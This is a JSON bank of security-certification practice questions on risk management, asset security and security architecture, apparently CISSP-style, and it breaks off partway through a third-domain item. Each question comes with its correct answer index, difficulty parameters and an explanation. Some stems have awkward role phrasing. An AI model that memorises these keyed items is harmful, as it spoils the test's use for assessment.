{
  "version": 2,
  "passScaledCut": 700,
  "domains": [
    "1 Security and Risk Management",
    "2 Asset Security",
    "3 Security Architecture and Engineering",
    "4 Communication and Network Security",
    "5 Identity and Access Management",
    "6 Security Assessment and Testing",
    "7 Security Operations",
    "8 Software Development Security"
  ],
  "items": [
    {
      "id": "d1-q1",
      "domain": "1 Security and Risk Management",
      "stem": "A CISO at a regional bank completes an annual risk assessment and identifies a threat with high likelihood but low potential impact. Which risk treatment option is MOST appropriate given a limited budget?",
      "choices": [
        "Accept the risk and document it with a risk owner and review schedule",
        "Escalate to the board for immediate remediation funding",
        "Implement a compensating control to eliminate the threat entirely",
        "Transfer the risk immediately to a cyber insurance policy"
      ],
      "correctIndex": 0,
      "difficulty": -0.8,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Accept the risk and document it with a risk owner and review schedule. When impact is low, acceptance is a reasonable and cost-effective treatment, provided it is formally documented and assigned an owner for periodic review. Transfer is better suited for high-impact, low-likelihood risks. Compensating controls cannot eliminate threats entirely. Board escalation is disproportionate for a low-impact finding."
    },
    {
      "id": "d1-q2",
      "domain": "1 Security and Risk Management",
      "stem": "A quantitative risk analysis determines the following for a server asset: Asset Value (AV) = $200,000; Exposure Factor (EF) = 40%; Annualized Rate of Occurrence (ARO) = 0.5. What is the Annualized Loss Expectancy (ALE)?",
      "choices": [
        "$100,000",
        "$20,000",
        "$80,000",
        "$40,000"
      ],
      "correctIndex": 3,
      "difficulty": 0.1,
      "discrimination": 1.1,
      "explanation": "Correct Answer: $40,000. SLE = AV x EF = $200,000 x 0.40 = $80,000. ALE = SLE x ARO = $80,000 x 0.5 = $40,000. $80,000 is the SLE, not the ALE. $100,000 incorrectly applies ARO to the full AV. $20,000 miscalculates one of the intermediate values."
    },
    {
      "id": "d1-q3",
      "domain": "1 Security and Risk Management",
      "stem": "A risk analyst is implementing a risk management framework for a federal agency. The agency must formally authorize systems before operation and continuously monitor controls. Which framework is MOST aligned to these requirements?",
      "choices": [
        "COBIT 2019",
        "FAIR (Factor Analysis of Information Risk)",
        "ISO/IEC 27001",
        "NIST Risk Management Framework (RMF)"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.05,
      "explanation": "Correct Answer: NIST Risk Management Framework (RMF). The NIST RMF specifically mandates system authorization (ATO - Authority to Operate) and continuous monitoring as core steps, making it the standard for federal agencies under FISMA. ISO 27001 is a broader ISMS standard without prescriptive authorization steps. COBIT focuses on IT governance. FAIR is a quantitative risk analysis model, not a lifecycle framework."
    },
    {
      "id": "d1-q4",
      "domain": "1 Security and Risk Management",
      "stem": "A security professional discovers that their employer has been falsifying audit logs submitted to a regulatory body. The employer instructs staff to keep this confidential. According to the ISC2 Code of Ethics, what should the professional do FIRST?",
      "choices": [
        "Follow employer direction and maintain confidentiality",
        "Consult with legal counsel before taking any action",
        "Resign from the organization immediately",
        "Act in the interest of public safety and report the violation to the appropriate authority"
      ],
      "correctIndex": 3,
      "difficulty": 0.3,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Act in the interest of public safety and report the violation to the appropriate authority. The ISC2 Code of Ethics canons are prioritized in order: protect society first, then act with integrity, then provide service to principals. When an employer's directive conflicts with societal protection, the professional must prioritize public safety. Following employer direction would violate the ethics code. Resignation alone does not fulfill the obligation to report. Legal consultation may follow but is not the first step."
    },
    {
      "id": "d1-q5",
      "domain": "1 Security and Risk Management",
      "stem": "A financial institution's CISO approved a new vendor contract that grants the vendor access to internal customer data systems. Three months into the engagement, an audit reveals the vendor does not enforce multi-factor authentication and stores copies of customer data in unencrypted local backups — practices that violate the institution's security policy. The board asks what governance step the CISO should have completed BEFORE signing the contract.",
      "choices": [
        "Conducted a formal pre-contract vendor security assessment verifying the vendor's controls against the institution's policy requirements",
        "Required the vendor to sign a liability indemnification clause placing all responsibility for breaches on the vendor",
        "Notified the regulator of the vendor engagement prior to contracting as required by third-party risk guidance",
        "Reviewed the vendor's publicly available marketing materials and customer references before approval"
      ],
      "correctIndex": 0,
      "difficulty": -0.5,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Conduct a formal pre-contract security assessment. This is the due diligence obligation — verifying the vendor's actual security posture against policy before granting access. A liability clause shifts financial risk but doesn't prevent a breach or validate controls. Regulatory notification requirements exist in some contexts but don't substitute for a security controls review. Marketing materials and customer references reflect reputation, not technical security posture."
    },
    {
      "id": "d1-q6",
      "domain": "1 Security and Risk Management",
      "stem": "A U.S.-based e-commerce company collects personal data from EU residents. They experience a breach affecting 15,000 EU data subjects. Under GDPR, what is the notification deadline to the supervisory authority?",
      "choices": [
        "72 hours from discovery of the breach",
        "48 hours from discovery of the breach",
        "30 days from discovery of the breach",
        "7 business days from discovery of the breach"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: 72 hours from discovery of the breach. Article 33 of GDPR requires notification to the competent supervisory authority within 72 hours of becoming aware of a personal data breach, where feasible. 30 days is not a GDPR requirement. 48 hours is not the GDPR standard. 7 business days is not specified under GDPR."
    },
    {
      "id": "d1-q7",
      "domain": "1 Security and Risk Management",
      "stem": "A security team has 6 weeks to complete a risk assessment for a new enterprise platform. They have subject-matter experts available across all business units but have not yet completed asset valuations or gathered historical incident cost data. Leadership wants prioritized threat rankings to guide security investment decisions. Which risk analysis approach is MOST appropriate given these constraints?",
      "choices": [
        "A qualitative approach using expert-rated likelihood and impact scales to produce prioritized threat rankings without requiring monetary asset valuations",
        "A quantitative approach calculating Annualized Loss Expectancy for each identified threat using actuarial loss tables",
        "Defer the risk assessment until complete asset valuation data is available to ensure accurate ALE calculations",
        "Use automated vulnerability scanner output as the risk assessment deliverable since it provides objective CVSS scores"
      ],
      "correctIndex": 0,
      "difficulty": -0.6,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Qualitative approach. When asset valuations and loss data are unavailable, qualitative analysis — using expert judgment, likelihood/impact matrices, and descriptive scales — is the appropriate method. It produces actionable prioritization quickly using available expertise. Quantitative analysis (ALE = SLE × ARO) requires monetary valuations and historical loss data that aren't yet available. Deferring the assessment creates a gap in risk visibility. Vulnerability scan CVSS scores measure technical severity, not business risk — they don't substitute for risk assessment."
    },
    {
      "id": "d1-q8",
      "domain": "1 Security and Risk Management",
      "stem": "A BCP team completes a business impact analysis for a customer billing system. The business determined the system cannot be offline for more than 4 hours without unacceptable revenue loss. The current recovery plan documents a 6-hour recovery window. The team is preparing recommendations for senior management. What is the MOST appropriate recommendation?",
      "choices": [
        "Present the gap to senior management and require that the recovery solution be improved to meet the 4-hour business tolerance, or obtain formal documented acceptance of the residual risk",
        "Revise the BIA to extend the business tolerance threshold to 8 hours so the recovery plan is compliant",
        "Accept the plan as-is — a 2-hour gap between recovery time and business tolerance is within normal operational variance",
        "Suspend billing operations proactively during any outage exceeding 4 hours until the recovery gap is resolved"
      ],
      "correctIndex": 0,
      "difficulty": 0.4,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Present the gap to management and require remediation or formal risk acceptance. The RTO must always fall within the MTD — a 6-hour RTO against a 4-hour MTD means the organization will exceed its business tolerance before recovery is complete, which is a plan failure. Senior management must either fund a faster recovery solution or formally accept the risk in writing. Extending the MTD to fit the RTO inverts the process — the MTD is driven by business impact, not plan capability. The gap is not 'within variance' — any RTO exceeding the MTD is a policy violation. Proactively suspending operations doesn't address the plan deficiency and creates additional business harm."
    },
    {
      "id": "d1-q9",
      "domain": "1 Security and Risk Management",
      "stem": "A security analyst is a privacy officer reviewing a new mobile health app that collects biometric data. The app requires users to share more data than is strictly necessary for its core function. Which privacy principle is being violated?",
      "choices": [
        "Purpose limitation",
        "Storage limitation",
        "Integrity and confidentiality",
        "Data minimization"
      ],
      "correctIndex": 3,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Data minimization. Data minimization requires that only data strictly necessary for the stated purpose be collected. Collecting more than necessary violates this principle. Purpose limitation restricts use of data to the original stated purpose. Storage limitation addresses how long data is retained. Integrity and confidentiality refers to protecting accuracy and preventing unauthorized access."
    },
    {
      "id": "d1-q10",
      "domain": "1 Security and Risk Management",
      "stem": "A threat analyst at a financial institution uses STRIDE to analyze a new payment API. She identifies a scenario where an attacker intercepts tokens between the API gateway and backend service and replays them to authorize fraudulent transactions. Which STRIDE category does this BEST represent?",
      "choices": [
        "Elevation of Privilege",
        "Repudiation",
        "Spoofing",
        "Tampering"
      ],
      "correctIndex": 2,
      "difficulty": 0.9,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Spoofing. Replaying a captured token allows the attacker to impersonate a legitimate user or service, which is Spoofing in STRIDE — falsely claiming an identity. Repudiation involves denying actions occurred. Elevation of Privilege means gaining higher access than authorized. Tampering involves modifying data, not impersonating an identity."
    },
    {
      "id": "d1-q11",
      "domain": "1 Security and Risk Management",
      "stem": "An organization's board of directors requires a single security document that: (1) formally states the executive commitment to information security, (2) applies to all employees and third parties, (3) is mandatory rather than advisory, and (4) does not prescribe specific technical configurations. The document will be reviewed and signed annually by the CEO. Which document type BEST fulfills all four requirements?",
      "choices": [
        "A security policy — it expresses management intent, establishes mandatory scope and accountability, and sets direction without specifying technical implementation details",
        "A security standard — it mandates specific technical controls and approved configurations that all systems must implement",
        "A security procedure — it provides step-by-step instructions employees follow to implement required controls",
        "A security guideline — it provides recommended best practices that teams may adopt at their discretion"
      ],
      "correctIndex": 0,
      "difficulty": -0.9,
      "discrimination": 0.95,
      "explanation": "Correct Answer: A security policy. Policies are the highest-level security documents — they express management commitment, define mandatory scope, and set direction without prescribing technical specifics. They are signed by senior executives and apply to the entire organization. Standards implement policy by specifying mandatory technical controls (encryption algorithms, password lengths) — they prescribe configuration, which requirement #4 excludes. Procedures provide operational step-by-step instructions — too granular for board-level governance. Guidelines are advisory and optional — requirement #3 requires mandatory applicability."
    },
    {
      "id": "d1-q12",
      "domain": "1 Security and Risk Management",
      "stem": "A board of directors approves a statement that the organization will not tolerate any risk of customer PII exposure above a 0.1% annual probability threshold. This statement BEST defines which concept?",
      "choices": [
        "Risk tolerance",
        "Risk appetite",
        "Risk acceptance",
        "Residual risk"
      ],
      "correctIndex": 0,
      "difficulty": 1.1,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Risk tolerance. Risk tolerance defines the acceptable variation or boundary around a specific risk objective — here expressed as a quantifiable threshold (0.1%). Risk appetite is the broader, strategic willingness to accept risk in pursuit of objectives. Risk acceptance is a treatment decision for a specific risk. Residual risk is what remains after controls are applied."
    },
    {
      "id": "d1-q13",
      "domain": "1 Security and Risk Management",
      "stem": "A federal system has completed the Assess step of the NIST RMF. The assessor finds that 3 controls are partially implemented and 1 is not implemented. What is the NEXT step in the RMF?",
      "choices": [
        "Authorize — submit the security authorization package to the Authorizing Official",
        "Implement — address the deficiencies identified during assessment",
        "Monitor — begin continuous monitoring of implemented controls",
        "Categorize — re-categorize the system based on new findings"
      ],
      "correctIndex": 0,
      "difficulty": 0.6,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Authorize — submit the security authorization package to the Authorizing Official. The RMF steps are: Prepare, Categorize, Select, Implement, Assess, Authorize, Monitor. After Assess, the next step is Authorize, where the Authorizing Official reviews the assessment results (including deficiencies) to make a risk-based decision. Deficiencies are addressed as part of the Plan of Action and Milestones (POA&M), not by restarting the Implement step. Monitor follows Authorization."
    },
    {
      "id": "d1-q14",
      "domain": "1 Security and Risk Management",
      "stem": "A manufacturing plant has $500,000 in production equipment. A fire could destroy 60% of it, and fires occur roughly once every 5 years. What is the Single Loss Expectancy (SLE)?",
      "choices": [
        "$100,000",
        "$500,000",
        "$300,000",
        "$60,000"
      ],
      "correctIndex": 2,
      "difficulty": -0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: $300,000. SLE = Asset Value x Exposure Factor = $500,000 x 0.60 = $300,000. $60,000 would be the ALE (SLE x ARO = $300,000 x 0.2). $500,000 represents full asset value with no exposure factor applied. $100,000 is a miscalculation."
    },
    {
      "id": "d1-q15",
      "domain": "1 Security and Risk Management",
      "stem": "The board of a multinational company asks the CISO to align security investments with business objectives and ensure IT governance supports the enterprise strategy. Which framework is MOST appropriate for this governance alignment?",
      "choices": [
        "ISO 27001",
        "COBIT 2019",
        "NIST Cybersecurity Framework (CSF)",
        "ITIL 4"
      ],
      "correctIndex": 1,
      "difficulty": 0.8,
      "discrimination": 1.1,
      "explanation": "Correct Answer: COBIT 2019. COBIT is specifically designed to align IT and security governance with business objectives, providing a governance and management framework for enterprise IT. NIST CSF is focused on cybersecurity risk management, not enterprise IT governance alignment. ITIL 4 addresses IT service management. ISO 27001 is an information security management standard, not a governance alignment framework."
    },
    {
      "id": "d1-q16",
      "domain": "1 Security and Risk Management",
      "stem": "During a BIA, a logistics company determines that its order management system can tolerate no more than 2 hours of downtime before orders are permanently lost and customers churn. This 2-hour threshold BEST represents which metric?",
      "choices": [
        "Work Recovery Time (WRT)",
        "Maximum Tolerable Downtime (MTD)",
        "Recovery Time Objective (RTO)",
        "Recovery Point Objective (RPO)"
      ],
      "correctIndex": 1,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Maximum Tolerable Downtime (MTD). The MTD (also called Maximum Tolerable Period of Disruption - MTPD) is the longest period a business process can be offline before the impact becomes unacceptable or permanent. The RTO is the target time to restore functionality (must be less than MTD). RPO defines the acceptable amount of data loss. WRT is the time needed to restore the system to full operation after recovery."
    },
    {
      "id": "d1-q17",
      "domain": "1 Security and Risk Management",
      "stem": "A critical infrastructure vendor is onboarded without a review of their software build pipeline security, code signing practices, or third-party library provenance. Six months later, a trojanized update is pushed to all customers. Which risk management failure is the PRIMARY cause?",
      "choices": [
        "Failure to implement endpoint detection on customer systems",
        "Absence of a vulnerability disclosure program",
        "Inadequate supply chain risk management",
        "Insufficient user awareness training"
      ],
      "correctIndex": 2,
      "difficulty": 1.0,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Inadequate supply chain risk management. The root cause is the failure to assess and manage risks introduced through a third-party vendor's software build pipeline — a classic supply chain attack (similar to SolarWinds). Endpoint detection is a detective control that may limit impact but is not the root cause. A vulnerability disclosure program addresses researcher reporting, not build pipeline integrity. User awareness training does not address vendor supply chain risks."
    },
    {
      "id": "d1-q18",
      "domain": "1 Security and Risk Management",
      "stem": "An employee receives a realistic phishing email that impersonates the CEO and requests an urgent wire transfer. The employee completes the transfer before noticing the sender's domain is slightly misspelled. Which security awareness program improvement would MOST directly address this vulnerability?",
      "choices": [
        "Requiring all wire transfers to use encrypted email",
        "Deploying a DMARC email authentication policy",
        "Implementing a password manager for all employees",
        "Targeted spear-phishing simulation exercises with follow-up training"
      ],
      "correctIndex": 3,
      "difficulty": -0.4,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Targeted spear-phishing simulation exercises with follow-up training. This addresses the human factor directly — training employees to recognize lookalike domains and verify urgent financial requests through out-of-band channels. DMARC helps with technical spoofing prevention but not look-alike domain attacks. Encrypted email does not prevent the social engineering element. Password managers do not address wire transfer social engineering."
    },
    {
      "id": "d1-q19",
      "domain": "1 Security and Risk Management",
      "stem": "A newly appointed CISO is asked to develop a 3-year information security strategic plan. Which activity should occur FIRST before drafting the strategy?",
      "choices": [
        "Select a security operations center vendor",
        "Draft a security awareness training curriculum",
        "Conduct a current-state gap assessment against a recognized security framework",
        "Define incident response runbooks for the top five threat scenarios"
      ],
      "correctIndex": 2,
      "difficulty": 0.7,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Conduct a current-state gap assessment against a recognized security framework. Before defining strategic direction, you must understand the current security posture and where gaps exist relative to a target state. A gap assessment provides the evidence base for the strategy. Training curricula, vendor selection, and runbooks are tactical activities that follow strategic direction, not precede it."
    },
    {
      "id": "d1-q20",
      "domain": "1 Security and Risk Management",
      "stem": "A penetration tester working under a signed rules of engagement agreement discovers evidence of active child exploitation material on a client's server while conducting authorized testing. The client's legal counsel instructs the tester not to document or report the finding. What should the tester do?",
      "choices": [
        "Follow client counsel's instruction since the engagement is governed by the signed contract",
        "Preserve evidence and report to law enforcement, as societal protection supersedes client confidentiality",
        "Report only to ISC2 and await guidance before taking further action",
        "Immediately delete the evidence to prevent further harm"
      ],
      "correctIndex": 1,
      "difficulty": 1.5,
      "discrimination": 1.3,
      "explanation": "Correct Answer: Preserve evidence and report to law enforcement, as societal protection supersedes client confidentiality. Under the ISC2 Code of Ethics, the first canon — protect society and the common good — takes precedence over duties to principals (clients). Criminal activity, especially involving child exploitation, must be reported to law enforcement regardless of client instruction. Deleting evidence would obstruct justice. Waiting for ISC2 guidance delays a legally required action."
    },
    {
      "id": "d2-q1",
      "domain": "2 Asset Security",
      "stem": "A data governance lead is a data analyst who accesses a dataset classified as Confidential. She emails a report derived from this data to a colleague without applying any classification marking. What data handling requirement has she violated?",
      "choices": [
        "Retention schedule compliance",
        "Data labeling and marking requirements",
        "Data minimization requirements",
        "Data encryption at rest requirements"
      ],
      "correctIndex": 1,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Data labeling and marking requirements. Classification markings must be applied to data and its derivatives so recipients understand handling requirements. Failing to mark a derivative product violates labeling policy. Data minimization addresses collection scope, not marking. Retention schedules govern how long data is kept. Encryption at rest applies to storage, not email transmission markings."
    },
    {
      "id": "d2-q2",
      "domain": "2 Asset Security",
      "stem": "A data governance audit at a financial services firm finds that the IT team has been independently making data classification decisions for customer transaction datasets because no business leader has formal accountability for them. Retention schedules are inconsistent, access requests are approved ad hoc, and two datasets have conflicting classification labels. To close this governance gap, which role should be formally designated and held accountable for classification decisions, access approvals, and retention schedules for these datasets?",
      "choices": [
        "A data owner from the business unit — typically a senior leader accountable for the dataset's classification, authorized use, and retention decisions",
        "The data custodian in IT — who manages storage and backup infrastructure and is best positioned to make technical classification decisions",
        "The data steward — who enforces classification standards across systems but operates under direction from the accountable business role",
        "The privacy officer — who ensures GDPR compliance and should own all data governance decisions to maintain regulatory alignment"
      ],
      "correctIndex": 0,
      "difficulty": -0.3,
      "discrimination": 1.0,
      "explanation": "Correct Answer: A data owner from the business unit. The data owner is the senior business leader accountable for the data — they have the authority and context to set classification, approve access, and define retention requirements. The data custodian (IT) implements technical controls but is not accountable for business decisions about data. The data steward operationalizes classification policy but acts under the owner's direction — they cannot replace the owner. The privacy officer has compliance authority over specific regulated data but is not the general data governance accountable role."
    },
    {
      "id": "d2-q3",
      "domain": "2 Asset Security",
      "stem": "A healthcare organization is audited and found to retain patient billing records for 12 years past the patient's last visit, despite a legal requirement to retain them for only 7 years. Which data lifecycle concern does this BEST represent?",
      "choices": [
        "Failure to apply proper data classification",
        "Non-compliance with access control requirements",
        "Violation of retention and disposal policy",
        "Breach of data minimization principles"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Violation of retention and disposal policy. Retaining data beyond its legally required retention period violates the organization's disposal obligations and creates unnecessary liability. Data minimization governs collection scope, not retention duration post-collection. Classification failures relate to labeling. Access controls govern who can access data, not how long it's retained."
    },
    {
      "id": "d2-q4",
      "domain": "2 Asset Security",
      "stem": "A government contractor decommissions laptops that stored Classified data. The security team wants to ensure the data cannot be recovered. Which method provides the HIGHEST assurance of data destruction for magnetic hard drives?",
      "choices": [
        "Seven-pass overwrite using DoD 5220.22-M",
        "Full-disk encryption and key deletion",
        "Degaussing followed by physical destruction",
        "Factory reset through the operating system"
      ],
      "correctIndex": 2,
      "difficulty": 0.3,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Degaussing followed by physical destruction. For classified data on magnetic media, degaussing (exposing to a strong magnetic field to destroy data) combined with physical destruction (shredding or disintegration) provides the highest assurance and meets NSA/CSS standards. Multi-pass overwrite is effective but less certain on modern drives with remapped sectors. Key deletion leaves encrypted data potentially recoverable if keys are ever found. Factory reset does not perform secure erasure."
    },
    {
      "id": "d2-q5",
      "domain": "2 Asset Security",
      "stem": "A DLP engineer is an IT manager preparing to donate 50 desktop computers to a school. The computers previously stored internal HR records. Which media sanitization method is MOST appropriate before donation?",
      "choices": [
        "Formatting — performing a standard OS-level format of each drive",
        "Clearing — overwriting all addressable storage locations using approved software",
        "Degaussing — exposing drives to a strong magnetic field",
        "Destruction — physically shredding the hard drives"
      ],
      "correctIndex": 1,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Clearing — overwriting all addressable storage locations using approved software. Clearing is appropriate for non-classified data being repurposed or donated outside the organization. It renders data unrecoverable using ordinary means. Degaussing renders the drive unusable and is appropriate for destruction scenarios, not donation. Physical destruction defeats the purpose of donation. Standard formatting is insufficient as data can be recovered with basic forensic tools."
    },
    {
      "id": "d2-q6",
      "domain": "2 Asset Security",
      "stem": "A SaaS provider stores customer data in a multi-tenant cloud environment. The customer (a law firm) needs assurance that their confidential data cannot be accessed by other tenants. Which control is MOST critical for the cloud provider to implement?",
      "choices": [
        "Dedicated network bandwidth allocation per tenant",
        "Customer-managed encryption keys stored on-premises",
        "Physical separation of servers for each tenant",
        "Logical separation and strong tenant isolation controls"
      ],
      "correctIndex": 3,
      "difficulty": 0.6,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Logical separation and strong tenant isolation controls. In a multi-tenant SaaS environment, logical isolation (access control enforcement, virtualization boundaries, namespace separation) is the primary protection against cross-tenant data access. Physical separation is impractical and cost-prohibitive in shared cloud models. Customer-managed keys protect against the provider but not other tenants directly. Bandwidth allocation is a performance control, not a confidentiality control."
    },
    {
      "id": "d2-q7",
      "domain": "2 Asset Security",
      "stem": "An e-commerce company plans to launch a loyalty rewards app. The privacy team insists that privacy protections be embedded into the system's architecture before development begins, rather than added afterward. This approach is BEST aligned with which principle?",
      "choices": [
        "Privacy by Design",
        "Privacy Impact Assessment",
        "Data minimization",
        "Purpose limitation"
      ],
      "correctIndex": 0,
      "difficulty": 0.3,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Privacy by Design. Privacy by Design (PbD) mandates embedding privacy protections into systems from the outset rather than as an add-on. It includes proactive rather than reactive measures. Data minimization is one principle within PbD but does not describe the overarching design philosophy. Purpose limitation restricts data use. A Privacy Impact Assessment (PIA) is an evaluation tool, not a design philosophy."
    },
    {
      "id": "d2-q8",
      "domain": "2 Asset Security",
      "stem": "A social media company collects users' birth dates, home addresses, browsing history, biometric face scans, and political preferences for a feature that only requires age verification. What is the MOST significant data governance concern?",
      "choices": [
        "Collection exceeds what is necessary for the stated purpose, violating data minimization",
        "Users have not completed security awareness training",
        "The retention schedule has not been defined",
        "Data is not labeled with appropriate classification markings"
      ],
      "correctIndex": 0,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Collection exceeds what is necessary for the stated purpose, violating data minimization. Age verification requires only birth date (or a derived confirmation). Collecting home addresses, browsing history, biometrics, and political preferences far exceeds necessity and violates data minimization principles under GDPR and most privacy frameworks. Classification markings, training, and retention schedules are secondary concerns when collection itself is improper."
    },
    {
      "id": "d2-q9",
      "domain": "2 Asset Security",
      "stem": "During an annual IT asset inventory, a large university discovers 47 servers that are not listed in the asset management system and are running unpatched operating systems. What is the FIRST action the security team should take?",
      "choices": [
        "Patch all 47 servers to the current baseline before cataloging them",
        "Immediately shut down all unregistered servers",
        "Identify the asset owners and classify the servers based on data they host",
        "Report the finding to executive leadership without further investigation"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Identify the asset owners and classify the servers based on data they host. Before taking action, you must understand what these assets are, who owns them, and what data they contain — this drives all subsequent decisions including patching priority and access controls. Immediately shutting them down could disrupt unknown critical services. Patching without classification ignores the data risk. Escalating without investigation lacks the context leadership needs."
    },
    {
      "id": "d2-q10",
      "domain": "2 Asset Security",
      "stem": "A security architect is applying NIST SP 800-53 controls to a new system. Not all baseline controls are applicable because the system is an isolated air-gapped research workstation with no network connectivity. The process of adjusting controls to fit the specific environment is called what?",
      "choices": [
        "Baselining",
        "Tailoring",
        "Overlaying",
        "Scoping"
      ],
      "correctIndex": 1,
      "difficulty": 0.8,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Tailoring. Tailoring is the process of adjusting a security control baseline to fit the organization's specific environment, mission, and risk tolerance — including adding, removing, or modifying controls. Scoping is a component of tailoring where non-applicable controls are identified and excluded. Overlaying applies additional controls for specific communities (e.g., classified national security systems). Baselining is establishing the initial set of required controls."
    },
    {
      "id": "d2-q11",
      "domain": "2 Asset Security",
      "stem": "A document marked 'CONFIDENTIAL — INTERNAL USE ONLY' is emailed to an external partner without authorization. Which stage of the data lifecycle does this incident primarily involve?",
      "choices": [
        "Data in use — handling and sharing controls failed at point of use",
        "Data in transit — encryption was not applied",
        "Data destruction — disposal policy was not followed",
        "Data at rest — storage controls were bypassed"
      ],
      "correctIndex": 0,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Data in use — handling and sharing controls failed at point of use. The failure occurred when an active user made a sharing decision — this is a data-in-use (or data-in-motion via human action) control failure, specifically around handling policy enforcement. Data at rest refers to stored data. Data in transit encryption is a separate concern from authorization to share. Data destruction is unrelated."
    },
    {
      "id": "d2-q12",
      "domain": "2 Asset Security",
      "stem": "A technology company develops a proprietary algorithm over several years. To protect it from unauthorized use, they choose not to file a patent. Instead, they rely on internal confidentiality agreements and restricted access. This protection strategy BEST aligns with which intellectual property mechanism?",
      "choices": [
        "Trademark",
        "Patent",
        "Trade secret protection",
        "Copyright"
      ],
      "correctIndex": 2,
      "difficulty": 0.4,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Trade secret protection. A trade secret protects proprietary business information through confidentiality, not public disclosure. It requires reasonable steps to maintain secrecy (NDAs, access restrictions). Unlike patents, trade secrets have no expiration but offer no protection if independently discovered. Copyright protects expression, not algorithms. Patents require public disclosure. Trademarks protect brand identifiers."
    },
    {
      "id": "d2-q13",
      "domain": "2 Asset Security",
      "stem": "Under GDPR, which category of data requires explicit consent for processing and receives the HIGHEST level of protection due to its sensitivity?",
      "choices": [
        "Pseudonymized data that can be re-linked to an individual",
        "Personally identifiable information such as names and email addresses",
        "Special category data, including health, biometric, and political opinion data",
        "Publicly available data posted by the individual on social media"
      ],
      "correctIndex": 2,
      "difficulty": 0.3,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Special category data, including health, biometric, and political opinion data. GDPR Article 9 designates special categories of personal data — including health, biometric, genetic, racial or ethnic origin, political opinions, religious beliefs, and sexual orientation — as requiring explicit consent and heightened protection. Regular PII (names, emails) is protected under GDPR but not at this elevated tier. Pseudonymized and publicly available data have different treatment rules."
    },
    {
      "id": "d3-q1",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A classified government system enforces a rule that subjects can only read data at their own classification level or below, and can only write data at their own level or above. Which security model does this BEST describe?",
      "choices": [
        "Biba integrity model",
        "Brewer-Nash (Chinese Wall) model",
        "Clark-Wilson model",
        "Bell-LaPadula model"
      ],
      "correctIndex": 3,
      "difficulty": -0.5,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Bell-LaPadula model. Bell-LaPadula enforces confidentiality with two properties: Simple Security Property (no read up — subjects cannot read data at higher classification levels) and *-Property (no write down — subjects cannot write to lower classification levels). Biba addresses integrity, not confidentiality. Clark-Wilson addresses integrity through well-formed transactions. Brewer-Nash prevents conflicts of interest."
    },
    {
      "id": "d3-q2",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A financial auditing system must prevent users from modifying data in ways that are not authorized and ensure that transactions are traceable and consistent. Which security model BEST addresses these integrity requirements?",
      "choices": [
        "Take-Grant model",
        "Lattice-based access control model",
        "Biba integrity model",
        "Bell-LaPadula model"
      ],
      "correctIndex": 2,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Biba integrity model. Biba focuses on data integrity with two main properties: Simple Integrity Property (no read down — subjects cannot read lower-integrity data) and *-Integrity Property (no write up — subjects cannot write to higher-integrity objects), preventing corruption from less-trusted sources. Bell-LaPadula addresses confidentiality. Take-Grant models access rights propagation. Lattice-based models are an implementation mechanism, not an integrity-specific model."
    },
    {
      "id": "d3-q3",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A hospital's medication dispensing system requires that all drug administration transactions be performed through certified application programs and that all changes be logged with before/after values. This design is MOST consistent with which security model?",
      "choices": [
        "Bell-LaPadula confidentiality model",
        "Biba integrity model",
        "Brewer-Nash (Chinese Wall) model",
        "Clark-Wilson integrity model"
      ],
      "correctIndex": 3,
      "difficulty": 0.7,
      "discrimination": 1.15,
      "explanation": "Correct Answer: Clark-Wilson integrity model. Clark-Wilson enforces integrity through well-formed transactions (Transformation Procedures - TPs) applied to Constrained Data Items (CDIs), with separation of duties enforced through access control triples. It is specifically designed for commercial integrity in transactional systems like financial or medical applications. Bell-LaPadula addresses confidentiality. Biba's model is simpler and doesn't require certified application programs. Brewer-Nash addresses conflicts of interest."
    },
    {
      "id": "d3-q4",
      "domain": "3 Security Architecture and Engineering",
      "stem": "An organization's internal web application uses a TLS certificate signed by the company's internal Certificate Authority. Internal employees access it without errors, but external partners report 'Certificate not trusted' warnings despite the certificate being valid and not expired. The application team says the certificate is correctly installed and the internal CA is properly configured. What is the MOST likely cause, and what is the BEST corrective action?",
      "choices": [
        "External partners' browsers do not have the internal root CA in their trust stores — distribute the internal root CA certificate to partner-managed endpoints, or replace the certificate with one signed by a publicly trusted CA",
        "The certificate's Common Name does not match the URL — regenerate the certificate with the correct Subject Alternative Names",
        "The TLS version on the web server is too old — upgrade to TLS 1.3 to resolve modern browser trust requirements",
        "The internal CA's CRL endpoint is unreachable from external networks — publish the CRL to an externally accessible URL"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.0,
